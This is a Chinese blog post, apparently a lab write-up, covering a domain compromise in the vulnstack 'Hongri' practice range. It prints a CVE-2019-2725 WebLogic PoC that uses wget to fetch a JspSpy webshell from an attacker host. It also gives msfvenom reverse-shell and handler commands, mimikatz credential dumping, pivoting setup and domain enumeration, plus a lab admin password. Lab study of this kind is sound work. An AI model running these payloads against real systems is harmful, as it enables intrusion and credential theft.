<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">

<link rel="stylesheet" href="/wan1/css/main.css">


<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="潜心学习，不骄不躁">
<meta property="og:type" content="website">
<meta property="og:title" content="十三の博客">
<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/page/36/index.html">
<meta property="og:site_name" content="十三の博客">
<meta property="og:description" content="潜心学习，不骄不躁">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="十三">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/page/36/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>十三の博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/wan1/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">十三の博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-ctf做题笔记">

    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>

  </li>
        <li class="menu-item menu-item-python">

    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>

  </li>
        <li class="menu-item menu-item-java">

    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>

  </li>
        <li class="menu-item menu-item-读书笔记">

    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-渗透测试">

    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>

  </li>
        <li class="menu-item menu-item-基础">

    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>

  </li>
        <li class="menu-item menu-item-轮子">

    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>

  </li>
        <li class="menu-item menu-item-漏洞库">

    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>

  </li>
        <li class="menu-item menu-item-工具">

    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>

  </li>
        <li class="menu-item menu-item-代码审计">

    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>

  </li>
        <li class="menu-item menu-item-逆向">

    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>

  </li>
        <li class="menu-item menu-item-应急响应">

    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>

  </li>
        <li class="menu-item menu-item-免杀">

    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>

  </li>
        <li class="menu-item menu-item-靶场">

    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>

  </li>
        <li class="menu-item menu-item-cve申请">

    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>

  </li>
        <li class="menu-item menu-item-c语言">

    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/wan1/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/" class="post-title-link" itemprop="url">vulnstack 红日靶场 二</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-23 16:29:18" itemprop="dateCreated datePublished" datetime="2022-08-23T16:29:18+08:00">2022-08-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-12-08 14:23:30" itemprop="dateModified" datetime="2022-12-08T14:23:30+08:00">2022-12-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/wan1/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vulnstack-红日靶场-二"><a href="#vulnstack-红日靶场-二" class="headerlink" title="vulnstack 红日靶场 二"></a>vulnstack 红日靶场 二</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下是拓扑图</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/1.png" alt="img"></p>
<p>1qaz@WSX</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web和pc两个网卡，一个nat一个仅主机，nat使用自动获取ip</span><br><span class="line">域控只有一个网卡，仅主机，只用能用内网访问</span><br><span class="line"></span><br><span class="line">开启服务</span><br><span class="line">进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径</span><br><span class="line">使用管理员才能进去administrator/1qaz@WSX</span><br><span class="line">以管理员权限执行startWebLogic</span><br></pre></td></tr></table></figure>

<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>首先拿到目标ip，我们进行一个端口扫描。</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818213441285.png" alt="image-20220818213441285"></p>
<p>其他端口的测试这里就不说了，这里我们使用weblogic扫描工具</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221438834.png" alt="image-20220818221438834"></p>
<p>存在CVE-2019-2725</p>
<p>在网上找到利用方法</p>
<p>访问</p>
<p><a target="_blank" rel="noopener" href="http://192.168.100.131:7001/_async/AsyncResponseService">http://192.168.100.131:7001/_async/AsyncResponseService</a></p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221643711.png" alt="image-20220818221643711"></p>
<p>随即使用poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.37.128:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 850</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;wget http://192.168.37.141:8080/JspSpy.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/JspSpy.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>我这里没有利用成功，弄了半天也没弄好，暂时放一下，后面再另外搭环境仔细复现一下。</p>
<p>现在我们使用msf工具中现成的exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2019-2725</span><br></pre></td></tr></table></figure>

<p>好家伙，exp也用不了，让我怀疑是不是环境出了问题，故去web服务器那看了一下。</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819164614026.png" alt="image-20220819164614026"></p>
<p>居然报错了，也不知道是什么原理，百度。</p>
<p>好家伙，是权限不足的原因，web要登录de1ay的管理员administrator账号才可以。</p>
<p>好的，然后360直接就给你拦截了</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819170807062.png" alt="image-20220819170807062"></p>
<p>受不了了，直接上工具</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819174013015.png" alt="image-20220819174013015"></p>
<p>这时候上线msf或者cs就可以开始下一步的渗透了。</p>
<p>先穿上一个冰蝎马</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183249345.png" alt="image-20220819183249345"></p>
<p>试着连接一下</p>
<p>发现连接成功！</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183539196.png" alt="image-20220819183539196"></p>
<p>然后我们试着传一个msf的马</p>
<p>传上去是传的上去，但是无法执行</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183745631.png" alt="image-20220819183745631"></p>
<p>但是我目前还不太会免杀捏，直接双击了</p>
<p>但是突然接了个项目，明天再战。</p>
<p>真的会谢，来了这学校之后电脑都变慢了，环境也不知道怎么回事毁掉了，只能重新装一遍靶场</p>
<p>最后还是用以上方法拿到权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.248.128 LPORT=1234 -f exe -o 1.exe   </span><br><span class="line">#生成木马</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.248.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit </span><br><span class="line">#监听</span><br></pre></td></tr></table></figure>



<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822140459372.png" alt="image-20220822140459372"></p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先收集本机的一些信息（如果连接windowsshell是乱码的状态可以使用这个语句解决<code>chcp 65001</code></p>
<p>arp、路由、杀软、防火墙、3389、hash密码、域内信息等</p>
<p>当前用户是域管理员</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142857742.png" alt="image-20220822142857742"></p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822141759574.png" alt="image-20220822141759574"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142810625.png" alt="image-20220822142810625"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>

<p>发现360卫视</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143044769.png" alt="image-20220822143044769"></p>
<p><code>net user /domain</code></p>
<p>查看域内用户</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143209338.png" alt="image-20220822143209338"></p>
<p>net time /domain查域控</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143345350.png" alt="image-20220822143345350"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**net config workstation 查看是否有域，以及当前登录域**</span><br><span class="line"></span><br><span class="line">**net view 查看域内主机列表**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台)**</span><br><span class="line"></span><br><span class="line">**net user /domain 查看域内所有域用户**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain admins&quot; /domain 查看域管理员列表**</span><br><span class="line"></span><br><span class="line">**然后通过ping 命令查看域中主机的ip**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查下补丁</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143749830.png" alt="image-20220822143749830"></p>
<p>最后整理一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">域名 de1ay                   杀软：360安全卫士          </span><br><span class="line"></span><br><span class="line">域内主机：三台  DC（10.10.10.10）  PC （10.10.10.201） WEB（10.10.10.80 和192.168.111.80   win2008R2）</span><br><span class="line"></span><br><span class="line">域用户：Administrator            de1ay                    Guest                    krbtgt                   mssql    </span><br><span class="line"></span><br><span class="line"> 补丁：                  [01]: KB2999226</span><br><span class="line">                           [02]: KB958488</span><br><span class="line">                           [03]: KB976902</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>有大佬提出这样的一个攻击思路</p>
<p>尝试直接新建具有鱼贯权限的用户hack，密码为1qaz@wsx，然后开3389远程登录 (不推荐）</p>
<p>但我还在学习阶段就暂时不用这种了。</p>
<p>用kiwi抓明文密码把</p>
<p>首先迁移进程到一个64位的system进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate 1928</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145222477.png" alt="image-20220822145222477"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145658759.png" alt="image-20220822145658759"></p>
<p>拿到其他主机的账号和密码</p>
<h3 id="路由或者代理实现横向"><a href="#路由或者代理实现横向" class="headerlink" title="路由或者代理实现横向"></a>路由或者代理实现横向</h3><ul>
<li>在内网渗透的时候，有时候我们想继续探测内网的资源，但是由于防火墙的原因导致我们无法继续访问内部资源，此时我们就可以考虑添加路由或者端口转发等技术。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf实现路由添加</span><br><span class="line"></span><br><span class="line">msf查看网卡情况，并且添加路由</span><br><span class="line">#获取当前主机下的网络架构分布</span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">添加路由访问</span><br><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line"></span><br><span class="line">#在全局给指定的session增删路由</span><br><span class="line"></span><br><span class="line">route add 192.168.11.0  255.255.255.0  1     #在session1中添加到达192.168.11.0网段的路由</span><br><span class="line">route add 192.168.12.0  255.255.255.0  1     #在session1中添加到达192.168.12.0网段的路由</span><br><span class="line">route add 0.0.0.0       0.0.0.0        1     #在session1中添加到达0.0.0.0/24网段的路由</span><br><span class="line">route del 192.168.12.0  255.255.255.0  2     #在session2中删除到达192.168.12.0网段的路由</span><br><span class="line">route print    #打印路由信息</span><br><span class="line"></span><br><span class="line">查看当前路由列表</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">查看当前网络下IP列表端口</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.22.0/24</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">利用proxychain配合socks4代理渗透</span><br><span class="line">如果我们不想在msf里面探测，我们可以使用socks4代理，实现在代理扫描，漏洞探测</span><br><span class="line">配置socks4代理</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">修改proxychain配置加入</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 192.168.131.159 2222</span><br><span class="line"></span><br><span class="line">调用代理执行nmap扫描目标</span><br><span class="line">proxychains nmap -Pn -sT 192.168.22.128</span><br></pre></td></tr></table></figure>

<p>改路由没扫到其他主机，不知道怎么回事</p>
<p>那我们挂个socks代理对内网的主机进行一个探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -PA 192.168.123.1/24</span><br><span class="line">#扫存活主机</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -T4 -p21,22,135,445,80,53,3389,8080,1433,8080 10.10.10.10</span><br><span class="line">#扫指定主机</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cxy163.net/archives/2081">nmap扫描局域网存活主机_nmap扫描在线主机的几种方法 | 绝缘体 (cxy163.net)</a></p>
<p>代理我后面再开个靶场自己练习</p>
<p>啥也没扫到，我人嘛了，直接上cs辅助吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.235.129</span><br><span class="line">set lport 8888</span><br><span class="line">set session 2</span><br><span class="line">run</span><br><span class="line">#cs那边记得监听</span><br></pre></td></tr></table></figure>

<p>好成功上线</p>
<p>这里使用cs的扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先扫一下内网存活主机</span><br><span class="line">shell arp -a</span><br></pre></td></tr></table></figure>



<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823154602108.png" alt="image-20220823154602108"></p>
<p>然后可以开始横向了</p>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h3><p>ping一下DC PC可以看到他们的ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DC 10.10.10.10</span><br><span class="line">PC 10.10.10.201</span><br></pre></td></tr></table></figure>

<p>这里可以扫一下内网主机+端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">portscan 网段 端口 协议（icmp arp none）线程</span><br><span class="line">portscan 10.10.10.0/24 445 arp 50</span><br><span class="line"></span><br><span class="line">portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823155316578.png" alt="image-20220823155316578"></p>
